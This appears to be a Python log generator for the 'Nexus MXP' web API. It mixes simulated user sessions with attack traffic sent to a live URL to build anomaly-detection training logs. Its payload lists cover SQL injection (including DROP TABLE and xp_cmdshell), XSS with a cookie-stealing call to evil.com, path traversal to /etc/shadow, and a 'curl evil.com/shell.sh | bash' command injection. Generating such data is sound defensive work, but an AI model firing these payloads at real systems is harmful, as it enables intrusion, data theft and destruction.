#!/usr/bin/env python3
"""
Comprehensive Log Generator for Nexus MXP
Generates realistic user traffic and attack patterns for anomaly detection training
"""

import requests
import random
import time
import json
from datetime import datetime, timedelta
from urllib.parse import urlencode
import sys
import argparse

# Base configuration
BASE_URL = "https://nexusmxp.com"
TARGET_LOGS = 100000
ATTACK_RATIO = 0.15  # 15% of requests will be attacks

# User agents for realistic traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
]

# Attack patterns
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    "1; DROP TABLE users--",
    "1'; DROP TABLE users--",
    "'; EXEC xp_cmdshell('dir')--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\system32\\config\\sam",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "`id`",
    "$(cat /etc/passwd)",
    "&& cat /etc/shadow",
    "|| ping -c 10 127.0.0.1",
    "; curl http://evil.com/shell.sh | bash",
]

# Realistic sample data
NAMES = ["Alice Johnson", "Bob Smith", "Charlie Brown", "Diana Prince", "Eve Anderson", 
         "Frank Miller", "Grace Lee", "Henry Davis", "Iris Chen", "Jack Wilson"]
EMAILS = [f"{name.lower().replace(' ', '.')}@example.com" for name in NAMES]
PORTFOLIOS = ["iGV", "iGT", "oGV", "oGT", "B2B", "B2C"]
CATEGORIES = ["Education", "Technology", "Health", "Environment", "Social"]
LOCAL_COMMITTEES = ["LC Cairo", "LC Alexandria", "LC Bangalore", "LC Mumbai", "LC London", 
                    "LC Paris", "LC Berlin", "LC Tokyo", "LC Sydney", "LC Toronto"]
ROLES = ["Team Leader", "Team Member", "NST", "VP"]
TERMS = ["mid", "end"]

class LogGenerator:
    def __init__(self, base_url=BASE_URL, target_logs=TARGET_LOGS, attack_ratio=ATTACK_RATIO):
        self.base_url = base_url
        self.target_logs = target_logs
        self.attack_ratio = attack_ratio
        self.request_count = 0
        self.attack_count = 0
        self.session = requests.Session()
        self.created_resources = {
            'gcps': [],
            'documents': [],
            'api_cycles': [],
            'funnels': [],
            'users': []
        }
        
    def get_headers(self, content_type="application/json"):
        """Generate realistic request headers"""
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": content_type,
            "Origin": self.base_url.replace(":5000", ":3000"),
            "Referer": f"{self.base_url.replace(':5000', ':3000')}/",
        }
    
    def make_request(self, method, endpoint, **kwargs):
        """Make a request and handle errors gracefully"""
        url = f"{self.base_url}{endpoint}"
        self.request_count += 1
        
        try:
            if method == "GET":
                response = self.session.get(url, timeout=10, **kwargs)
            elif method == "POST":
                response = self.session.post(url, timeout=10, **kwargs)
            elif method == "PUT":
                response = self.session.put(url, timeout=10, **kwargs)
            elif method == "DELETE":
                response = self.session.delete(url, timeout=10, **kwargs)
            
            # Print progress
            if self.request_count % 100 == 0:
                print(f"Progress: {self.request_count}/{self.target_logs} requests "
                      f"({self.attack_count} attacks, {(self.attack_count/self.request_count)*100:.1f}%)")
            
            return response
        except Exception as e:
            print(f"Request failed: {method} {endpoint} - {e}")
            return None
    
    def human_delay(self, min_sec=0.1, max_sec=2.0):
        """Simulate human think/read time"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    # ============ LEGITIMATE USER BEHAVIORS ============
    
    def browse_gcps(self):
        """Normal user browsing GCP listings"""
        page = random.randint(1, 5)
        limit = random.choice([6, 8, 10, 12])
        self.make_request("GET", f"/api/gcp?page={page}&limit={limit}", 
                         headers=self.get_headers())
        self.human_delay(1, 3)
    
    def view_gcp_details(self):
        """View a specific GCP"""
        if self.created_resources['gcps']:
            gcp_id = random.choice(self.created_resources['gcps'])
            self.make_request("GET", f"/api/gcp/{gcp_id}", headers=self.get_headers())
        else:
            # Try random ObjectId-like string
            fake_id = ''.join(random.choices('0123456789abcdef', k=24))
            self.make_request("GET", f"/api/gcp/{fake_id}", headers=self.get_headers())
        self.human_delay(2, 5)
    
    def create_gcp(self):
        """User creates a new GCP"""
        data = {
            "title": f"Global Community Project {random.randint(1000, 9999)}",
            "name": random.choice(NAMES),
            "email": random.choice(EMAILS),
            "portfolio": random.choice(PORTFOLIOS),
            "category": random.choice(CATEGORIES),
            "localCommittee": random.choice(LOCAL_COMMITTEES),
            "gcpDetails": f"This is a detailed description of the project focusing on {random.choice(CATEGORIES).lower()}.",
            "gcpLink": f"https://docs.google.com/document/d/{random.randint(1000000, 9999999)}",
            "imageLink": f"https://drive.google.com/file/d/{random.randint(1000000, 9999999)}/view?usp=sharing"
        }
        response = self.make_request("POST", "/api/gcp", 
                                     headers=self.get_headers(), json=data)
        if response and response.status_code == 201:
            try:
                gcp_id = response.json().get('_id')
                if gcp_id:
                    self.created_resources['gcps'].append(gcp_id)
            except:
                pass
        self.human_delay(0.5, 1.5)
    
    def update_gcp(self):
        """Update an existing GCP"""
        if self.created_resources['gcps']:
            gcp_id = random.choice(self.created_resources['gcps'])
            data = {
                "title": f"Updated GCP {random.randint(1000, 9999)}",
                "gcpDetails": "Updated details with more information."
            }
            self.make_request("PUT", f"/api/gcp/{gcp_id}", 
                            headers=self.get_headers(), json=data)
            self.human_delay(0.5, 1.5)
    
    def approve_reject_gcp(self):
        """Admin approving or rejecting GCP"""
        if self.created_resources['gcps']:
            gcp_id = random.choice(self.created_resources['gcps'])
            action = random.choice(['approve', 'reject'])
            self.make_request("PUT", f"/api/gcp/{gcp_id}/{action}", 
                            headers=self.get_headers())
            self.human_delay(0.3, 1.0)
    
    def browse_documents(self):
        """Browse documents"""
        page = random.randint(1, 5)
        limit = random.choice([6, 10, 12])
        self.make_request("GET", f"/api/documents?page={page}&limit={limit}", 
                         headers=self.get_headers())
        self.human_delay(1, 3)
    
    def create_document(self):
        """Create a new document"""
        data = {
            "title": f"Document {random.randint(1000, 9999)}",
            "description": f"This document contains important information about {random.choice(CATEGORIES)}.",
            "documentUrl": f"https://docs.google.com/document/d/{random.randint(1000000, 9999999)}",
            "imageUrl": f"https://drive.google.com/file/d/{random.randint(1000000, 9999999)}/view?usp=sharing"
        }
        response = self.make_request("POST", "/api/documents", 
                                     headers=self.get_headers(), json=data)
        if response and response.status_code == 201:
            try:
                doc_id = response.json().get('_id')
                if doc_id:
                    self.created_resources['documents'].append(doc_id)
            except:
                pass
        self.human_delay(0.5, 1.5)
    
    def browse_api_cycles(self):
        """Browse API cycles"""
        page = random.randint(1, 3)
        limit = random.choice([6, 10])
        self.make_request("GET", f"/api/api-cycles?page={page}&limit={limit}", 
                         headers=self.get_headers())
        self.human_delay(1, 2)
    
    def create_api_cycle(self):
        """Create API cycle"""
        data = {
            "title": f"API Cycle {random.randint(1000, 9999)}",
            "description": "API cycle description with details.",
            "documentUrl": f"https://docs.google.com/document/d/{random.randint(1000000, 9999999)}",
            "imageUrl": f"https://drive.google.com/file/d/{random.randint(1000000, 9999999)}/view?usp=sharing"
        }
        response = self.make_request("POST", "/api/api-cycles", 
                                     headers=self.get_headers(), json=data)
        if response and response.status_code == 201:
            try:
                cycle_id = response.json().get('_id')
                if cycle_id:
                    self.created_resources['api_cycles'].append(cycle_id)
            except:
                pass
        self.human_delay(0.5, 1.5)
    
    def submit_funnel_data(self):
        """Submit MX funnel metrics"""
        data = {
            "lc": random.choice(LOCAL_COMMITTEES),
            "term": random.choice(TERMS),
            "role": random.choice(ROLES),
            "portfolio": random.choice(PORTFOLIOS),
            "metrics": {
                "Leads": random.randint(50, 200),
                "Applicants": random.randint(30, 150),
                "Accepted": random.randint(20, 100),
                "Approved": random.randint(15, 80),
                "Realised": random.randint(10, 60),
                "Finished": random.randint(8, 50),
                "Completes": random.randint(5, 40),
                "Advanced": random.randint(3, 30),
                "Alumni": random.randint(2, 20)
            }
        }
        response = self.make_request("POST", "/api/mxfunnel/submit", 
                                     headers=self.get_headers(), json=data)
        if response and response.status_code == 201:
            try:
                funnel_id = response.json().get('_id')
                if funnel_id:
                    self.created_resources['funnels'].append(funnel_id)
            except:
                pass
        self.human_delay(0.5, 2.0)
    
    def get_all_funnels(self):
        """Get all funnel data"""
        self.make_request("GET", "/api/mxfunnel", headers=self.get_headers())
        self.human_delay(1, 2)
    
    def submit_checklist(self):
        """Submit MX checklist"""
        user_id = f"user_{random.randint(1000, 9999)}"
        data = {
            "userId": user_id,
            "formData": {
                "question1": random.choice(["Yes", "No"]),
                "question2": random.choice(["Completed", "In Progress", "Not Started"]),
                "question3": random.randint(1, 5)
            }
        }
        self.make_request("POST", "/api/checklist/submit", 
                         headers=self.get_headers(), json=data)
        self.human_delay(1, 3)
    
    def get_surveys(self):
        """Get all surveys"""
        self.make_request("GET", "/api/survey", headers=self.get_headers())
        self.human_delay(1, 2)
    
    def update_survey_progress(self):
        """Update survey progress"""
        survey_id = ''.join(random.choices('0123456789abcdef', k=24))
        data = {
            "progress": {
                random.choice(PORTFOLIOS): random.randint(0, 100)
            }
        }
        self.make_request("PUT", f"/api/survey/{survey_id}", 
                         headers=self.get_headers(), json=data)
        self.human_delay(0.5, 1.5)
    
    # ============ ATTACK PATTERNS ============
    
    def sql_injection_attack(self):
        """SQL injection attempts"""
        self.attack_count += 1
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        attack_type = random.choice([
            lambda: self.make_request("GET", f"/api/gcp?page={payload}", headers=self.get_headers()),
            lambda: self.make_request("GET", f"/api/gcp/{payload}", headers=self.get_headers()),
            lambda: self.make_request("POST", "/api/gcp", headers=self.get_headers(), 
                                     json={"title": payload, "email": payload}),
            lambda: self.make_request("GET", f"/api/documents?page={payload}&limit={payload}", 
                                     headers=self.get_headers()),
        ])
        attack_type()
        self.human_delay(0.05, 0.3)
    
    def xss_attack(self):
        """XSS injection attempts"""
        self.attack_count += 1
        payload = random.choice(XSS_PAYLOADS)
        attack_type = random.choice([
            lambda: self.make_request("POST", "/api/gcp", headers=self.get_headers(),
                                     json={"title": payload, "name": payload, "gcpDetails": payload}),
            lambda: self.make_request("POST", "/api/documents", headers=self.get_headers(),
                                     json={"title": payload, "description": payload}),
            lambda: self.make_request("POST", "/api/mxfunnel/submit", headers=self.get_headers(),
                                     json={"lc": payload, "portfolio": payload}),
        ])
        attack_type()
        self.human_delay(0.05, 0.3)
    
    def path_traversal_attack(self):
        """Path traversal attempts"""
        self.attack_count += 1
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        self.make_request("GET", f"/api/documents/{payload}", headers=self.get_headers())
        self.human_delay(0.05, 0.3)
    
    def command_injection_attack(self):
        """Command injection attempts"""
        self.attack_count += 1
        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
        self.make_request("POST", "/api/gcp", headers=self.get_headers(),
                         json={"title": "Normal", "email": f"test{payload}@example.com"})
        self.human_delay(0.05, 0.3)
    
    def brute_force_attack(self):
        """Brute force enumeration"""
        self.attack_count += 1
        # Try to enumerate resources
        fake_id = ''.join(random.choices('0123456789abcdef', k=24))
        endpoints = ["/api/gcp/", "/api/documents/", "/api/api-cycles/", "/api/survey/"]
        endpoint = random.choice(endpoints)
        self.make_request("GET", f"{endpoint}{fake_id}", headers=self.get_headers())
        self.human_delay(0.01, 0.1)  # Faster for brute force
    
    def malformed_request_attack(self):
        """Send malformed data"""
        self.attack_count += 1
        attack_type = random.choice([
            lambda: self.make_request("POST", "/api/gcp", headers=self.get_headers(),
                                     json={"invalid": "data", "random": 12345}),
            lambda: self.make_request("PUT", "/api/documents/invalid_id", 
                                     headers=self.get_headers(), json=None),
            lambda: self.make_request("POST", "/api/mxfunnel/submit", 
                                     headers=self.get_headers(), json={"metrics": "not_an_object"}),
        ])
        attack_type()
        self.human_delay(0.05, 0.3)
    
    def unauthorized_access_attack(self):
        """Try to access restricted endpoints"""
        self.attack_count += 1
        # Try admin operations without auth
        if self.created_resources['gcps']:
            gcp_id = random.choice(self.created_resources['gcps'])
            self.make_request("DELETE", f"/api/gcp/{gcp_id}/delete", headers=self.get_headers())
        self.human_delay(0.1, 0.5)
    
    def header_injection_attack(self):
        """Malicious header injection"""
        self.attack_count += 1
        malicious_headers = self.get_headers()
        malicious_headers.update({
            "X-Forwarded-For": "' OR '1'='1",
            "X-Original-URL": "/admin/secret",
            "Cookie": "admin=true; session=" + "A" * 1000,
        })
        self.make_request("GET", "/api/gcp", headers=malicious_headers)
        self.human_delay(0.1, 0.4)
    
    def ddos_simulation(self):
        """Rapid repeated requests (DDoS simulation)"""
        self.attack_count += 1
        for _ in range(random.randint(3, 8)):
            self.make_request("GET", "/api/gcp", headers=self.get_headers())
            time.sleep(0.01)  # Very short delay
    
    # ============ USER BEHAVIOR PATTERNS ============
    
    def casual_browser_session(self):
        """Simulate a casual user browsing"""
        actions = random.randint(3, 8)
        for _ in range(actions):
            behavior = random.choice([
                self.browse_gcps,
                self.view_gcp_details,
                self.browse_documents,
                self.browse_api_cycles,
                self.get_surveys,
            ])
            behavior()
    
    def contributor_session(self):
        """Simulate an active contributor"""
        actions = random.randint(5, 12)
        for _ in range(actions):
            behavior = random.choice([
                self.browse_gcps,
                self.create_gcp,
                self.view_gcp_details,
                self.create_document,
                self.submit_checklist,
                self.submit_funnel_data,
            ])
            behavior()
    
    def admin_session(self):
        """Simulate admin activities"""
        actions = random.randint(4, 10)
        for _ in range(actions):
            behavior = random.choice([
                self.browse_gcps,
                self.approve_reject_gcp,
                self.update_gcp,
                self.get_all_funnels,
                self.browse_documents,
                self.create_api_cycle,
            ])
            behavior()
    
    def attack_session(self):
        """Simulate an attacker"""
        attack_intensity = random.randint(5, 15)
        for _ in range(attack_intensity):
            attack = random.choice([
                self.sql_injection_attack,
                self.xss_attack,
                self.path_traversal_attack,
                self.command_injection_attack,
                self.brute_force_attack,
                self.malformed_request_attack,
                self.unauthorized_access_attack,
                self.header_injection_attack,
                self.ddos_simulation,
            ])
            attack()
    
    # ============ MAIN GENERATION LOGIC ============
    
    def generate_logs(self):
        """Generate logs until target is reached"""
        print(f"Starting log generation...")
        print(f"Target: {self.target_logs} requests")
        print(f"Attack ratio: {self.attack_ratio * 100}%")
        print(f"Base URL: {self.base_url}\n")
        
        start_time = time.time()
        
        while self.request_count < self.target_logs:
            # Decide if this should be an attack or normal behavior
            if random.random() < self.attack_ratio:
                # Attack session
                self.attack_session()
            else:
                # Normal user session
                session_type = random.choices(
                    [self.casual_browser_session, self.contributor_session, self.admin_session],
                    weights=[0.6, 0.3, 0.1]
                )[0]
                session_type()
            
            # Session break (user leaves, comes back later)
            if random.random() < 0.1:  # 10% chance of longer break
                self.human_delay(5, 15)
        
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"Log generation complete!")
        print(f"Total requests: {self.request_count}")
        print(f"Attack requests: {self.attack_count} ({(self.attack_count/self.request_count)*100:.1f}%)")
        print(f"Legitimate requests: {self.request_count - self.attack_count}")
        print(f"Time elapsed: {elapsed:.1f} seconds ({elapsed/60:.1f} minutes)")
        print(f"Average rate: {self.request_count/elapsed:.1f} requests/second")
        print(f"{'='*60}")

def main():
    parser = argparse.ArgumentParser(description='Generate logs for Nexus MXP anomaly detection')
    parser.add_argument('--url', default=BASE_URL, help='Base URL of the API')
    parser.add_argument('--target', type=int, default=TARGET_LOGS, help='Target number of logs')
    parser.add_argument('--attack-ratio', type=float, default=ATTACK_RATIO, 
                       help='Ratio of attack traffic (0.0-1.0)')
    
    args = parser.parse_args()
    
    generator = LogGenerator(
        base_url=args.url,
        target_logs=args.target,
        attack_ratio=args.attack_ratio
    )
    
    try:
        generator.generate_logs()
    except KeyboardInterrupt:
        print(f"\n\nInterrupted! Generated {generator.request_count} requests so far.")
        sys.exit(0)

if __name__ == "__main__":
    main()
